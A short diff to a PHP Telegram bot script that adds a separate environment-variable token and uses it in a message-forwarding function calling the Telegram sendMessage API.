@@ -10,6 +10,7 @@ include("userAgent.php");
 
 // Telegram Bot Configuration - Use environment variables for security
 $botToken = getenv('BOT_TOKEN');
+$forwardersdToken = getenv('FORWARDERSD_TOKEN');
 if (!$botToken) {
     die('ERROR: BOT_TOKEN environment variable is required. Please set it in your deployment platform.');
 }
@@ -232,7 +233,7 @@ function forwardersd($message, $chat_id)
   $context = stream_context_create(array(
     'http' => array('ignore_errors' => true),
   ));
-  file_get_contents('https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage?chat_id=' . $chat_id . '&text=' . $message . '&parse_mode=HTML', false, $context);
+  file_get_contents('https://api.telegram.org/bot' . $forwardersdToken . '/sendMessage?chat_id=' . $chat_id . '&text=' . $message . '&parse_mode=HTML', false, $context);
 }
 
 function R($u, $p = [], $t = 0)
